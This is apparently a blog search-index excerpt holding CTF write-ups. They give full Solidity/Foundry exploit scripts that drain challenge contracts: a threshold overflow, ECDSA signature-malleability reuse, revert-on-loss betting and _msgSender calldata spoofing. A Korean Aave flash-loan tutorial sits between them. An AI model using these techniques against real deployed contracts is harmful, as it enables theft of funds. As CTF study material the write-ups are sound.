96 will be casted by the uint96() function, it will be 0 via overflow. yes it’s so simple, we can just set the threshold to 0 using overflowbut it requires that the accumulatedWeight vlaue is equal or bigger that totalWeight / 2. before, we setted the it to 50 using the  safeTransferFrom() function. but this function can set only 50 but if we use the safeBatchTransferFrom() function, we can increase this value by multiples of 50 for the number of ids in the arraySolve.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import \"forge-std/Script.sol\";import \"src/openzeppelin-contracts/utils/cryptography/ECDSA.sol\";import {Challenge} from \"../src/Challenge.sol\";import {AdminNFT} from \"../src/AdminNFT.sol\";import {Bridge} from \"../src/Bridge.sol\";contract Solve is Script {    using ECDSA for bytes;    using ECDSA for bytes32;    Challenge public challenge;    AdminNFT public adminNFT;    Bridge public bridge;    address private player;    address private _challenge = 0x428a7ec1f430613568113B448b790C517C842D76;    uint256 private playerPrivateKey = 0x5cecd56dd7a945a96c2a226ded44ba5ef9f0fea2caf85a6c00d15c633cb84c13;    function run() external {        challenge = Challenge(_challenge);        adminNFT = challenge.ADMIN_NFT();        bridge = challenge.BRIDGE();        player = vm.addr(playerPrivateKey);        vm.startBroadcast(playerPrivateKey);        console.log(\"Starting exploit...\");        challenge.solveStage1(6);        require(challenge.stage1Solved(), \"Stage 1 not solved\");        challenge.solveStage2(5959, 1);        require(challenge.stage2Solved(), \"Stage 2 not solved\");        challenge.solveStage3(1, 0, 2);        require(challenge.stage3Solved(), \"Stage 3 not solved\");        bridge.verifyChallenge();        require(challenge.challengeSolved(), \"Challenge not solved\");        require(challenge.solver() == player, \"Player is not the solver\");        adminNFT.safeTransferFrom(player, address(bridge), 0, 0, bytes(\"\"));        require(bridge.validatorWeights(player) == 50, \"Validator weight incorrect after single transfer\");        uint256[] memory amaaaaan = new uint256[](300);        for (uint i = 0; i &lt; amaaaaan.length; i++) {            amaaaaan[i] = 0;        }        uint256;        adminNFT.safeBatchTransferFrom(player, address(bridge), amaaaaan, amaaaaan, bytes(\"\"));        require(bridge.validatorWeights(player) == 10_050, \"Validator weight incorrect after batch transfer\");        require(bridge.totalWeight() == 20_050, \"Total weight incorrect after batch transfer\");        uint256 newThreshold = 2 ** 96;         bytes memory message = abi.encode(address(challenge), address(adminNFT), newThreshold);        bytes32 ethSignedMessageHash = message.toEthSignedMessageHash();        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, ethSignedMessageHash);        bytes memory signature = abi.encodePacked(r, s, v);        bytes[] memory signatures = new bytes[](1);        signatures[0] = signature;        bridge.changeBridgeSettings(message, signatures);        require(bridge.threshold() == 0, \"Threshold did not overflow to 0\");        bridge.withdrawEth(bytes32(\"\"), new bytes[](0), player, type(uint256).max, bytes(\"\"));        require(address(bridge).balance == 0, \"Bridge balance not 0 after withdrawal\");        require(challenge.isSolved(), \"Challenge not fully solved\");        console.log(\"Exploit completed successfully\");        vm.stopBroadcast();    }})so just attack to get the flag using this logicCasino Avengers    function isSolved() external view returns (bool) {        return address(PLAYER).balance &gt;= 99 ether            &amp;&amp; address(CASINO).balance == 0;    }we should drain the Casino contract’s balance and get 99 or more ether    modifier whenNotPaused {        if (paused) revert Paused();        _;    }// (...) skip    function deposit(address receiver) external payable {        _deposit(msg.sender, receiver, msg.value);    }first of all, we should deposit in casino to play a game but internal function is paused and it’s checked by whenNotPaused() modeifier. if the paused is false, we can use internal function.    function pause(        bytes memory signature,        bytes32 salt    ) external {        _verifySignature(signature, abi.encode(0, salt));        paused = !paused;    }we can change it with the pause() function but there is _verifySignature() function which performs the signature verification    function _verifySignature(bytes memory signature, bytes memory digest) internal {        if (nullifiers[signature]) revert SignatureAlreadyUsed();        address signatureSigner = ECDSA.recover(keccak256(digest), signature);        if (signatureSigner != signer) revert InvalidSignature();        nullifiers[signature] = true;    }in the _verifySignature() function, it recovers the signature by the ECDSA.recover() function then check that the signatureSinger is equal with singer or not. singer is which signed with vm.envString(\"MNEMONIC\")'s pv key.so we need to make signature(r, v, s) then verify that it is equal with singer or not but there is a signature value duplication verification so we cannot pass it even we know pvKey// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/ECDSA.sol)but this casino uses the ECDSA which vulnerable to signature malleability. this library provide EIP-2098 compact signature so we can exploit it. different signature but same singerAddress -&gt; bypass duplicates (r, v, s ~&gt; r, vs)// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.28;import \"forge-std/Script.sol\";import \"../src/Challenge.sol\";import \"../src/Casino.sol\";contract Solve is Script {    address public PLAYER;    address public SIGNER;    address public challengeAddress = 0x1DE370ea59CD090aE8AB711f45791462FE9388fb;    uint256 public playerPrivateKey = 0xc0f770872cf69c87ed47f69f8129d8beaea5b5747d76e510a0a61e2037bb3d56;    uint256 public targetBalance = 99 ether;    Challenge public challenge;    Casino public casino;    constructor() {        challenge = Challenge(challengeAddress);        PLAYER = challenge.PLAYER();        casino = challenge.CASINO();        SIGNER = casino.signer();    }    function convertToEIP2098(bytes32 r, bytes32 s, uint8 v) public pure returns (bytes32, bytes32) { // by ChatGPT Ammmeennn        require(v == 27 || v == 28, \"Invalid v value\");        bytes32 vs = s | bytes32(uint256(v - 27) &lt;&lt; 255);        return (r, vs);    }    function splitSignature(bytes memory signature)        public        pure        returns (bytes32 r, bytes32 s, uint8 v)    {        require(signature.length == 65, \"Invalid signature length\");        assembly {            r := mload(add(signature, 0x20))            s := mload(add(signature, 0x40))            v := byte(0, mload(add(signature, 0x60)))        }    }    function run() external {        bytes32 r;        bytes32 s;        uint8 v;        bytes32 vs;        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;        bytes memory signature = hex\"8b7342b87c27fef0d248ddcfee8109981cba01babcd6c867b62fdf2ed8cab756406b8794b1adefb5b069038c4c2d989663212a6d1ffa6bdb1ce5c984b6afec841c\";        (r, s, v) = splitSignature(signature);        (r, vs) = convertToEIP2098(r, s, v);        vm.startBroadcast(playerPrivateKey);        console.log(\"casino balance : \", address(casino).balance);        console.log(\"player balance : \", address(PLAYER).balance);        console.log(\"signer address : \", SIGNER);        casino.pause(            abi.encodePacked(r, vs),            salt        );        console.log(\"puase : \", casino.paused());        vm.stopBroadcast();    }}we can resume with this code, let’s go next step    function _withdraw(address withdrawer, address receiver, uint256 amount) internal whenNotPaused {        if (balances[withdrawer] &lt; amount) revert InvalidAmount();        if (address(this).balance &lt; amount) amount = address(this).balance;        balances[withdrawer] -= amount;        emit Withdraw(withdrawer, receiver, amount);        reciever.call{value: amount}(\"\");    }and we can withdraw it if we have balance in casino    function bet(uint256 amount) external returns (bool) {        if (balances[msg.sender] &lt; amount) revert InvalidAmount();        uint256 random = uint256(keccak256(abi.encode(gasleft(), block.number, totalBets)));        bool win = random % 2 == 1;        if (win) balances[msg.sender] += amount;        else balances[msg.sender] -= amount;        totalBets++;        emit Bet(msg.sender, amount, win);        return win;    }if we win a game, we can fill our balances to amount but this amount should smaller than our balance. so we should win almost 100 times to earn more than 99 ether. from now on, we should think how to always win because our balances goes down when we lose the gamebut i couldn’t win the gam. i just tried to keep calling the bet() function till i win 100 times. however as i told, our balances goes down when we lose the game, acrroding to this logic, we can’t keep playing the game because we have no our balance in casino.however if we’re gonna call the revert() function when we lose the game then play again? our balances not goes down so well able to keep playing it. it was a scenario ans seems nice. but states is revert to before transaction was performed if the revert() function is called while operating on EVM so i could not do it.// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.8.2 &lt;0.9.0;contract ameeeen {    function bet(uint256 num) external returns (bool) {        if ((num % 2) == 0) {            return true;        }        else {            return false;        }    }}contract Callllll {    mapping(uint =&gt; bool) public balances;    ameeeen public am;    bool checkkkkkk;        constructor() {        am = new ameeeen();    }    function asdf1() external {        for(uint i = 0; i &lt; 100; i++){            asdf2(i);        }    }    function asdf11() external {        for(uint i = 0; i &lt; 100; i++){            address(this).call(abi.encodeWithSignature(\"asdf2(uint256)\", i));        }    }    function asdf2(uint256 num) internal returns (bool) {        bool checkk;        checkk = am.bet(num);        if (checkk == true) {            return true;        } else {            revert();        }    }}if we call some function with the .call() function, only the transaction performed through .call() function is reverted.. so i wrote test code as above, when i called the asdf1() function, it was reverted before transaction was performed but when i call the asdf11() it was just reverted the transaction which performed via .call() function. so we can just exploit with this trick to get winning.Solve.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.28;import \"forge-std/Script.sol\";import \"../src/Challenge.sol\";import \"../src/Casino.sol\";contract Solve is Script {    address public PLAYER;    address public SIGNER;    address public challengeAddress = 0xE11F8942C5Cf5Ccab5FB69e6F8A57aAB66779b3c;    uint256 public playerPrivateKey = 0x346b49a856db3bdd7fb2d4b126051630cc0851fb7c85bb2dab397d07e6a134d1;    uint256 public targetBalance = uint256(~~~address(casino).balance);    Challenge public challenge;    Casino public casino;    constructor() {        challenge = Challenge(challengeAddress);        PLAYER = challenge.PLAYER();        casino = challenge.CASINO();        SIGNER = casino.signer();    }    function convertToEIP2098(bytes32 r, bytes32 s, uint8 v) public pure returns (bytes32, bytes32) { // by ChatGPT Ammmeennn        require(v == 27 || v == 28, \"Invalid v value\");        bytes32 vs = s | bytes32(uint256(v - 27) &lt;&lt; 255);        return (r, vs);    }    function t(uint256 a) pure public returns (uint256) {        return ~~~(uint256(a));    }    function splitSignature(bytes memory signature)        public        pure        returns (bytes32 r, bytes32 s, uint8 v)    {        require(signature.length == 65, \"Invalid signature length\");        assembly {            r := mload(add(signature, 0x20))            s := mload(add(signature, 0x40))            v := byte(0, mload(add(signature, 0x60)))        }    }    function run() external {        bytes32 r;        bytes32 s;        uint8 v;        bytes32 vs;        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;        bytes memory signature = hex\"32740cc719bfdb5f10af41671b9dc16affeea5cb88d7abacebdded60cdc50a6d46c86e7ad26a56e4e77c307047a02f7c3d0d91bb91428f2b392643781ea89b4c1c\";        (r, s, v) = splitSignature(signature);        (r, vs) = convertToEIP2098(r, s, v);        vm.startBroadcast(playerPrivateKey);        console.log(\"casino balance : \", address(casino).balance);        console.log(\"player balance : \", address(PLAYER).balance);        console.log(\"signer address : \", SIGNER);        casino.pause(abi.encodePacked(r, vs), salt);        casino.deposit{value:0.2 ether}(address(this));        console.log(\"puase : \", casino.paused());        console.log(\"casino player balance before bet() : \", casino.balances(address(this)));        attack();        console.log(\"casino player balance after bet() : \", casino.balances(address(this)));        //console.log(\"isSolved : \", challenge.isSolved());        vm.stopBroadcast();    }    function attack() public {        while (casino.balances(address(this)) &lt; targetBalance) {            uint256 amount = casino.balances(address(this));            uint256 _amount;            if (targetBalance - amount &lt;= amount) {                _amount = targetBalance - amount;            } else {                _amount = amount;            }            address(this).call(abi.encodeWithSignature(\"call_bet(uint256)\", _amount));        }    }    function call_bet(uint256 amount) public {        casino.bet(amount);        uint256 after_amt = casino.balances(address(this));        if (after_amt &gt; amount) {            return;        }        revert();    }}so we can just exploit with this trick to get winning. and then we should call the reset() function to withdraw moneywhy aren’t all transactions reverted?func (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *uint256.Int) (ret []byte, leftOverGas uint64, err error) {\t// Capture the tracer start/end events in debug mode\tif evm.Config.Tracer != nil {\t\tevm.captureBegin(evm.depth, CALL, caller.Address(), addr, input, gas, value.ToBig())\t\tdefer func(startGas uint64) {\t\t\tevm.captureEnd(evm.depth, startGas, leftOverGas, ret, err)\t\t}(gas)\t}\t// Fail if we're trying to execute above the call depth limit\tif evm.depth &gt; int(params.CallCreateDepth) {\t\treturn nil, gas, ErrDepth\t}\t// Fail if we're trying to transfer more than the available balance\tif !value.IsZero() &amp;&amp; !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\t\treturn nil, gas, ErrInsufficientBalance\t}\tsnapshot := evm.StateDB.Snapshot()\tp, isPrecompile := evm.precompile(addr)\tif !evm.StateDB.Exist(addr) {\t\tif !isPrecompile &amp;&amp; evm.chainRules.IsEIP4762 &amp;&amp; !isSystemCall(caller) {\t\t\t// add proof of absence to witness\t\t\twgas := evm.AccessEvents.AddAccount(addr, false)\t\t\tif gas &lt; wgas {\t\t\t\tevm.StateDB.RevertToSnapshot(snapshot)\t\t\t\treturn nil, 0, ErrOutOfGas\t\t\t}\t\t\tgas -= wgas\t\t}\t\tif !isPrecompile &amp;&amp; evm.chainRules.IsEIP158 &amp;&amp; value.IsZero() {\t\t\t// Calling a non-existing account, don't do anything.\t\t\treturn nil, gas, nil\t\t}\t\tevm.StateDB.CreateAccount(addr)\t}\tevm.Context.Transfer(evm.StateDB, caller.Address(), addr, value)\tif isPrecompile {\t\tret, gas, err = RunPrecompiledContract(p, input, gas, evm.Config.Tracer)\t} else {\t\t// Initialise a new contract and set the code that is to be used by the EVM.\t\t// The contract is a scoped environment for this execution context only.\t\tcode := evm.resolveCode(addr)\t\tif len(code) == 0 {\t\t\tret, err = nil, nil // gas is unchanged\t\t} else {\t\t\taddrCopy := addr\t\t\t// If the account has no code, we can abort here\t\t\t// The depth-check is already done, and precompiles handled above\t\t\tcontract := NewContract(caller, AccountRef(addrCopy), value, gas)\t\t\tcontract.IsSystemCall = isSystemCall(caller)\t\t\tcontract.SetCallCode(&amp;addrCopy, evm.resolveCodeHash(addrCopy), code)\t\t\tret, err = evm.interpreter.Run(contract, input, false)\t\t\tgas = contract.Gas\t\t}\t}\t// When an error was returned by the EVM or when setting the creation code\t// above we revert to the snapshot and consume any gas remaining. Additionally,\t// when we're in homestead this also counts for code storage gas errors.\tif err != nil {\t\tevm.StateDB.RevertToSnapshot(snapshot)\t\tif err != ErrExecutionReverted {\t\t\tif evm.Config.Tracer != nil &amp;&amp; evm.Config.Tracer.OnGasChange != nil {\t\t\t\tevm.Config.Tracer.OnGasChange(gas, 0, tracing.GasChangeCallFailedExecution)\t\t\t}\t\t\tgas = 0\t\t}\t\t// TODO: consider clearing up unused snapshots:\t\t//} else {\t\t//\tevm.StateDB.DiscardSnapshot(snapshot)\t}\treturn ret, gas, err}we can find the call’s code in geth. the call() function creates new Contract to execute the bytecode. so new contract will be reverted when the revert() function is called and that’s why all transaction aren’t revertedi feel again that it is always very important to know the specifications of the system like EVM or smth else, i still have a lot to learn"
  },
  
  {
    "title": "Simple FlashLoan, Based on Aave V3",
    "url": "/posts/flashloan-aave/",
    "categories": "DeFi",
    "tags": "",
    "date": "2025-01-24 00:00:00 +0900",
    





    
    "snippet": "개요플래시론은 DeFi에서의 무담보 대출이다. 사용자는 플래시론을 통해서 원하는 ERC 20 토큰을 대출받아 사용할 수 있으며 이렇게 대출받은 대금은 한 트랜잭션 내에서 상환까지 모두 이루어져야 한다. 만약 대출금 상환이 제대로 이루어지지 않는다면 플래시론을 시작으로 생성된 트랜잭션은 없던 것으로 간주되며 Pool로 돈이 상환되게 된다.사용자가 유동성...",
    "content": "개요플래시론은 DeFi에서의 무담보 대출이다. 사용자는 플래시론을 통해서 원하는 ERC 20 토큰을 대출받아 사용할 수 있으며 이렇게 대출받은 대금은 한 트랜잭션 내에서 상환까지 모두 이루어져야 한다. 만약 대출금 상환이 제대로 이루어지지 않는다면 플래시론을 시작으로 생성된 트랜잭션은 없던 것으로 간주되며 Pool로 돈이 상환되게 된다.사용자가 유동성 풀에 원하는 토큰에 대해서 대출을 요청하면 풀에서 대출이 실행되며, 대출받은 토큰을 이용해서 우리가 원하는 작업을 수행할 수 있다. 원하는 작업을 수행한 이후에는 풀로 대출금과 프리미엄을 상환하도록 승인하고, 대출금 + 프리미엄을 풀로 다시 상환하며 하나의 트랜잭션이 마무리된다.Flashloan.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.10;import {FlashLoanSimpleReceiverBase} from \"@aave/core-v3/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol\";import {IPoolAddressesProvider} from \"@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol\";import {IERC20} from \"@aave/core-v3/contracts/dependencies/openzeppelin/contracts/IERC20.sol\";import \"hardhat/console.sol\";contract FlashLoan is FlashLoanSimpleReceiverBase {    address payable public owner;        constructor(address _addressProvider)        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider))    {        owner = payable(msg.sender);    }    function executeOperation(        address asset,        uint256 amount,        uint256 premium,        address initiator,        bytes calldata params    ) external override returns (bool) {        uint256 amountOwed = amount + premium;        IERC20(asset).approve(address(POOL), amountOwed);        return true;    }    function requestFlashLoan(address _token, uint256 _amount) public onlyOwner {        address receiverAddress = address(this);         address asset = _token;         uint256 amount = _amount;         bytes memory params = \"\";        uint16 referralCode = 0;         POOL.flashLoanSimple(            receiverAddress,            asset,            amount,            params,            referralCode        );    }    function getBalance(address _tokenAddress) external view returns (uint256) {        return IERC20(_tokenAddress).balanceOf(address(this));    }    function withdraw(address _tokenAddress) external onlyOwner {        IERC20 token = IERC20(_tokenAddress);                           // Create an instance of the token contract.        token.transfer(msg.sender, token.balanceOf(address(this)));     // Transfer the token balance to the contract owner.    }    modifier onlyOwner() {        require(            msg.sender == owner,            \"You are not the owner!\"        );        _;    }    receive() external payable {}}위 컨트랙트는 Aave 프로토콜의 simple 함수를 활용하여 플래시론을 실행할 수 있는 컨트랙트이다. 대출자는 requestFlashLoan() 함수를 호출해서 대출을 요청하면 POOL.flashLoanSimple() 함수를 통해서 풀에 대출을 요청한다.lib/aave-v3-core/contracts/protocol/pool/Pool.sol:flashLoanSimple  function flashLoanSimple(    address receiverAddress,    address asset,    uint256 amount,    bytes calldata params,    uint16 referralCode  ) public virtual override {    DataTypes.FlashloanSimpleParams memory flashParams = DataTypes.FlashloanSimpleParams({      receiverAddress: receiverAddress,      asset: asset,      amount: amount,      params: params,      referralCode: referralCode,      flashLoanPremiumToProtocol: _flashLoanPremiumToProtocol,      flashLoanPremiumTotal: _flashLoanPremiumTotal    });    FlashLoanLogic.executeFlashLoanSimple(_reserves[asset], flashParams);  }flashLoanSimple() 함수를 보면 FlashloanSimpleParams 구조체로 flashParams 변수를 메모리로 저장하고, _reserves 매핑에 저장된 데이터와 flashParams 값을 executeFlashLoanSimple() 함수르 전달한다.lib/aave-v3-core/contracts/protocol/libraries/logic/FlashLoanLogic.sol:executeFlashLoanSimple()  function executeFlashLoanSimple(    DataTypes.ReserveData storage reserve,    DataTypes.FlashloanSimpleParams memory params  ) external {    // The usual action flow (cache -&gt; updateState -&gt; validation -&gt; changeState -&gt; updateRates)    // is altered to (validation -&gt; user payload -&gt; cache -&gt; updateState -&gt; changeState -&gt; updateRates) for flashloans.    // This is done to protect against reentrance and rate manipulation within the user specified payload.    ValidationLogic.validateFlashloanSimple(reserve);    IFlashLoanSimpleReceiver receiver = IFlashLoanSimpleReceiver(params.receiverAddress);    uint256 totalPremium = params.amount.percentMul(params.flashLoanPremiumTotal);    IAToken(reserve.aTokenAddress).transferUnderlyingTo(params.receiverAddress, params.amount);    require(      receiver.executeOperation(        params.asset,        params.amount,        totalPremium,        msg.sender,        params.params      ),      Errors.INVALID_FLASHLOAN_EXECUTOR_RETURN    );    _handleFlashLoanRepayment(      reserve,      DataTypes.FlashLoanRepaymentParams({        asset: params.asset,        receiverAddress: params.receiverAddress,        amount: params.amount,        totalPremium: totalPremium,        flashLoanPremiumToProtocol: params.flashLoanPremiumToProtocol,        referralCode: params.referralCode      })    );  }executeFlashLoanSimple() 함수를 보면 제일 먼저 validateFlashloanSimple() 함수를 이용하여 대출이 가능한 상태인지 확인한다. 이후 대출자의 IFlashLoanSimpleReceiver 인터페이스를 호출하는 것을 볼 수 있다. 대출을 하는 사용자는 컨트랙트 내에 꼭 IFlashLoanSimpleReceiver 인터페이스를 포함해야 한다. 이후 flashLoanPremiumTotal를 기준으로 프리미엄을 계산하고, 대출자에게 대금을 전송해 준다.이제 대출자 입장에서는 대출금을 받은 상태이며, 대출자의 executeOperation() 함수가 호출된다. 이 함수 내에 대출금을 이용해 원하는 작업의 코드를 실행시킬 수 있다.        uint256 amountOwed = amount + premium;        IERC20(asset).approve(address(POOL), amountOwed);여기서 이 함수를 호출할 때 미리 계산된 프리미엄 값도 함께 넘겨주고 있는데, executeOperation() 함수 내에서는 대출금 + 프리미엄 값을 위와 같이 승인해 주어야 한다. 이렇게 상환할 대출금까지 승인이 되었다면 _handleFlashLoanRepayment() 함수를 호출해서 상환을 시작한다.lib/aave-v3-core/contracts/protocol/libraries/logic/FlashLoanLogic.sol:_handleFlashLoanRepayment  function _handleFlashLoanRepayment(    DataTypes.ReserveData storage reserve,    DataTypes.FlashLoanRepaymentParams memory params  ) internal {    uint256 premiumToProtocol = params.totalPremium.percentMul(params.flashLoanPremiumToProtocol);    uint256 premiumToLP = params.totalPremium - premiumToProtocol;    uint256 amountPlusPremium = params.amount + params.totalPremium;    DataTypes.ReserveCache memory reserveCache = reserve.cache();    reserve.updateState(reserveCache);    reserveCache.nextLiquidityIndex = reserve.cumulateToLiquidityIndex(      IERC20(reserveCache.aTokenAddress).totalSupply() +        uint256(reserve.accruedToTreasury).rayMul(reserveCache.nextLiquidityIndex),      premiumToLP    );    reserve.accruedToTreasury += premiumToProtocol      .rayDiv(reserveCache.nextLiquidityIndex)      .toUint128();    reserve.updateInterestRates(reserveCache, params.asset, amountPlusPremium, 0);    IERC20(params.asset).safeTransferFrom(      params.receiverAddress,      reserveCache.aTokenAddress,      amountPlusPremium    );    IAToken(reserveCache.aTokenAddress).handleRepayment(      params.receiverAddress,      params.receiverAddress,      amountPlusPremium    );    emit FlashLoan(      params.receiverAddress,      msg.sender,      params.asset,      params.amount,      DataTypes.InterestRateMode(0),      params.totalPremium,      params.referralCode    );  }_handleFlashLoanRepayment() 함수를 보면 제일 먼저 totalPremium 값을 프로토콜에 줄 수수료와 LP에게 줄 수수료를 나누어서 저장을 하고, 유동성 풀 상태, 수수료, 이자율을 업데이트하고, 플래시론을 받은 컨트랙트로부터 상환할 금액을 유동성 풀로 전송을 하고 있다. 이후 handleRepayment() 함수를 통해서 대출을 모두 상환했다는 내용에 대한 기록을 하며 마무리를 짓는다.플래시론 트랜잭션을 보면 위와 같이 하나의 트랜잭션 내에서 1,000 USDC 대출 이후에 바로 상환까지 이루어지는 것을 확인할 수 있다. 상환된 잔액을 보면 .5 USDC가 더 추가되었는데 이는 프리미엄 값이 포함되었기 때문이다."
  },
  
  {
    "title": "Dreamhack CTF (ERC1337)",
    "url": "/posts/ERC1337-DH/",
    "categories": "CTF",
    "tags": "",
    "date": "2024-04-07 00:00:00 +0900",
    





    
    "snippet": "개요ERC1337 문제는 Third Contract 분석을 통해서 에 구조를 파악하여 취약점을 악용하여 Owner가 가지고 있는 토큰을 탈취하는 문제이다.contract Level {    ERC1337 public token;    uint256 public solved;        constructor() {        token = new E...",
    "content": "개요ERC1337 문제는 Third Contract 분석을 통해서 에 구조를 파악하여 취약점을 악용하여 Owner가 가지고 있는 토큰을 탈취하는 문제이다.contract Level {    ERC1337 public token;    uint256 public solved;        constructor() {        token = new ERC1337(\"DHT\");    }    function solve() external {        if (token.balanceOf(address(this)) == 1) {            solved = 1;        }    }}ERC1337.sol 파일을 보면 Level이라는 컨트랙트 내에 solve() 함수가 있다. 함수를 보면 Level 컨트랙트의 token 잔액이 1이면 문제가 풀리는 것을 확인할 수 있다. 1 ether가 아닌 1이다.ERC1337.solcontract ERC1337 is ERC20, EIP712, Nonces, ERC2771Context {    bytes32 private constant PERMIT1_TYPEHASH = keccak256(\"Permit(string note,address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");    bytes32 private constant PERMIT2_TYPEHASH = keccak256(\"Permit(address origin,address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");    error ERC2612ExpiredSignature();    error ERC2612InvalidSigner();    constructor(string memory name) ERC20(name, \"\") EIP712(name, \"1\") ERC2771Context(address(0)) {        _mint(_msgSender(), 9999 ether);    }    function permitAndTransfer(        string memory note,        address owner,        address spender,        uint256 value,        uint256 deadline,        uint8 v,        bytes32 r,        bytes32 s    ) public {        if (block.timestamp &gt; deadline) {            revert ERC2612ExpiredSignature();        }        if (!_verifySignatureType1(            owner,             _hashTypedDataV4(keccak256(abi.encode(                PERMIT1_TYPEHASH,                note,                owner,                spender,                value,                _useNonce(owner),                deadline            ))),             v, r, s        ) &amp;&amp; !_verifySignatureType2(            owner,             _hashTypedDataV4(keccak256(abi.encode(                PERMIT2_TYPEHASH,                tx.origin,                owner,                spender,                value,                _useNonce(owner),                deadline            ))),             v, r, s        )) {            revert ERC2612InvalidSigner();        }        _approve(owner, spender, value);        _transfer(owner, spender, value);    }    function ecrecover(        bytes32 hash,        uint8 v,        bytes32 r,        bytes32 s    ) public pure returns (address) {        return ECDSA.recover(hash, v, r, s);    }    function _verifySignatureType1(        address owner,        bytes32 hash,        uint8 v,        bytes32 r,        bytes32 s    ) internal view returns (bool) {        try this.ecrecover(hash, v, r, s) returns (address signer) {            return signer == owner;        } catch {            return false;        }    }    function _verifySignatureType2(        address owner,        bytes32 hash,        uint8 v,        bytes32 r,        bytes32 s    ) internal view returns (bool) {        try this.ecrecover(hash, v, r, s) returns (address signer) {            return signer == _msgSender() || signer == owner;        } catch {            return false;        }    }    function nonces(address owner) public view override(Nonces) returns (uint256) {        return super.nonces(owner);    }    function DOMAIN_SEPARATOR() external view returns (bytes32) {        return _domainSeparatorV4();    }    function isTrustedForwarder(address forwarder) public view override(ERC2771Context) returns (bool) {        uint256 calldataLength = msg.data.length;        uint256 contextSuffixLength = _contextSuffixLength() + 32;        if (calldataLength &gt;= contextSuffixLength &amp;&amp;             bytes32(msg.data[calldataLength - contextSuffixLength:calldataLength - contextSuffixLength + 32]) == keccak256(abi.encode(name()))) {            return true;        } else {            return super.isTrustedForwarder(forwarder);        }    }}ERC1337.sol 파일에 있는 ERC1337 컨트랙트이다. 보면 EIP712가 사용되고 있는 것을 볼 수 있는데, 이는 Typed Structured Data로 구조화된 데이터에 대한 해싱과 서명 검증을 위한 표준 프로토콜이다.토큰을 다른 사용자에게 전송하기 위해서 permitAndTransfer() 함수를 사용할 수 있다. permitAndTransfer() 함수를 보면 조건문 내에 조건이 2개가 있지만 둘 중에 하나만 만족하면 된다. 그러나 _verifySignatureType1() 함수를 보면 서명된 메시지를 통해 복구한 주소와 owner 주소와 비교하는 것을 볼 수 있다. 이는 즉, 메시지를 owner의 개인키로 서명해야 한다는 것인데 이는 불가능하다.    function _verifySignatureType2(        address owner,        bytes32 hash,        uint8 v,        bytes32 r,        bytes32 s    ) internal view returns (bool) {        try this.ecrecover(hash, v, r, s) returns (address signer) {            return signer == _msgSender() || signer == owner;        } catch {            return false;        }    }그러나 _verifySignatureType2() 함수를 보면 누가봐도 이상한 로직이 있다. 복구한 주소를 그냥 owner 주소만을 가지고 비교하면 되는데 _msgSender() 함수의 반환 값을 복구한 주소와 비교하는 것을 볼 수 있다.ERC2771Context.sol    function _msgSender() internal view virtual override returns (address) {        uint256 calldataLength = msg.data.length;        uint256 contextSuffixLength = _contextSuffixLength();        if (isTrustedForwarder(msg.sender) &amp;&amp; calldataLength &gt;= contextSuffixLength) {            return address(bytes20(msg.data[calldataLength - contextSuffixLength:]));        } else {            return super._msgSender();        }    }_msgSender() 함수는 ERC2771Context.sol 파일에 정의되어 있다. 코드를 보면 isTrustedForwarder() 함수를 호출하는 것을 볼 수 있는데 이는 ERC1337.sol 파일에 정의되어 있다.그리고 만약 조건이 부합하다면 전달받은 calldata의 마지막 20 바이트 값만 반환하는 것을 확인할 수 있다. 이 말은 위 조건을 맞춰주고, calldata의 마지막 20 바이트의 우리가 원하는 값을 넣는다면 _msgSender()의 반환 값을 조작할 수 있다는 뜻이다.    function isTrustedForwarder(address forwarder) public view override(ERC2771Context) returns (bool) {        uint256 calldataLength = msg.data.length;        uint256 contextSuffixLength = _contextSuffixLength() + 32;        if (calldataLength &gt;= contextSuffixLength &amp;&amp;             bytes32(msg.data[calldataLength - contextSuffixLength:calldataLength - contextSuffixLength + 32]) == keccak256(abi.encode(name()))) {            return true;        } else {            return super.isTrustedForwarder(forwarder);        }    }isTrustedForwarder() 함수를 보면 상위 32바이트의 값을 토큰의 이름을 ABI 인코딩하여 Keccak-256 해시한 값과 비교하는 것을 볼 수 있다. 그러니 calldata의 상위 32 바이트에는 토큰 이름은 DHT라는 값을 포함 시키면 된다.EIP712.sol    bytes32 private constant TYPE_HASH =        keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\");    function _domainSeparatorV4() internal view returns (bytes32) {        if (address(this) == _cachedThis &amp;&amp; block.chainid == _cachedChainId) {            return _cachedDomainSeparator;        } else {            return _buildDomainSeparator();        }    }    function _buildDomainSeparator() private view returns (bytes32) {        return keccak256(abi.encode(TYPE_HASH, _hashedName, _hashedVersion, block.chainid, address(this)));    }    /**     * @dev Given an already https://eips.ethereum.org/EIPS/eip-712#definition-of-hashstruct[hashed struct], this     * function returns the hash of the fully encoded EIP712 message for this domain.     *     * This hash can be used together with {ECDSA-recover} to obtain the signer of a message. For example:     *     * ```solidity     * bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(     *     keccak256(\"Mail(address to,string contents)\"),     *     mailTo,     *     keccak256(bytes(mailContents))     * )));     * address signer = ECDSA.recover(digest, signature);     * ```     */    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), structHash);    }ERC1337 내에서 주소 복구를 할 때, 서명과 함께 사용할 해시를 생성하는 방식은 EIP712.sol 파일 내에 있는 함수로 이루어진다. _buildDomainSeparator() 함수 내에서 해시 이름과 해시 버전은 ERC1337에서 상속되는 생성자를 보면 EIP712(name, \"1\") 와 같이 하고 있기 때문에 각 각, DHT, 1로 설정하면 된다.Step by Step  